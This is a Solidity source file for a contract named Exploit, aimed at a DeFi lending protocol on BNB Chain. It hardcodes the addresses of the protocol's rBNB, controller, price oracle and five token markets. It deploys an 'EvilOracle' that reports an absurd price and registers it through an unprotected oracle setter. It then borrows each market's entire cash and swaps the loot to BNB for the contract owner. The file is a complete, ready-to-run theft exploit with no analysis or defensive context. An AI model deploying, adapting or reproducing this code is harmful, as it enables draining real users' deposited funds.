pragma solidity ^0.5.16;

import "./RBinance.sol";
import "./Cointroller.sol";
import "./SimplePriceOracle.sol";
import "./RBep20Delegate.sol";

contract EvilOracle {
    function decimals() public returns(uint256) {
        return 18;
    }

    function latestRoundData() public returns(uint80, int256, uint256, uint256, uint80) {
        return (0, 10**50, 0, 0, 0);
    }
}

interface PancakeRouter {
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
}

contract Exploit {
    address public owner;
    struct Target {
        RBinance rbnb;
        Cointroller cointroller;
        SimplePriceOracle simplePriceOracle;
        PancakeRouter router;
        address WBNB;
    }

    constructor () public {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "o");
        _;
    }

    function attack() public payable onlyOwner {
        //  exploitable contract addresses
        Target memory target;
        target.rbnb = RBinance(0x157822aC5fa0Efe98daa4b0A55450f4a182C10cA);
        target.cointroller = Cointroller(0x4f3e801Bd57dC3D641E72f2774280b21d31F64e4);
        target.simplePriceOracle = SimplePriceOracle(0xD55f01B4B51B7F48912cD8Ca3CDD8070A1a9DBa5);
        target.router = PancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        target.WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

        // mint rbnb
        target.rbnb.mint.value(0.0001 ether)();

        // enterMarkets for rBNB
        address[] memory rTokens = new address[](1);
        rTokens[0] = address(target.rbnb);
        target.cointroller.enterMarkets(rTokens);

        // create and set evil oracle
        address evilOracle = address(new EvilOracle());
        target.simplePriceOracle.setOracleData(address(target.rbnb), oracleChainlink(evilOracle));

        // for all rtoken, getCash to get borrow-able amount, borrow and swap for BNB
        RBep20Delegate[] memory rbep20 = new RBep20Delegate[](5);
        rbep20[0] = RBep20Delegate(0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5);  // rUSDC;
        rbep20[1] = RBep20Delegate(0x53aBF990bF7A37FaA783A75FDD75bbcF8bdF11eB);  // rBTC;
        rbep20[2] = RBep20Delegate(0x9B9006cb01B1F664Ac25137D3a3a20b37d8bC078);  // rDAI;
        rbep20[3] = RBep20Delegate(0x383598668C025Be0798E90E7c5485Ff18D311063);  // rUSDT;
        rbep20[4] = RBep20Delegate(0x6db6A55E57AC8c90477bBF00ce874B988666553A);  // rBUSD;
        for (uint256 i = 0; i < rbep20.length; i++) {
            uint256 borrowAmount = rbep20[i].getCash();
            rbep20[i].borrow(borrowAmount);

            EIP20NonStandardInterface token = EIP20NonStandardInterface(rbep20[i].underlying());
            address[] memory path = new address[](2);
            path[0] = address(address(token));
            path[1] = target.WBNB;
            token.approve(address(target.router), uint(-1));
            target.router.swapExactTokensForETH(token.balanceOf(address(this)), 0, path, owner, now);
        }

    }
   
    function() external payable {}
}
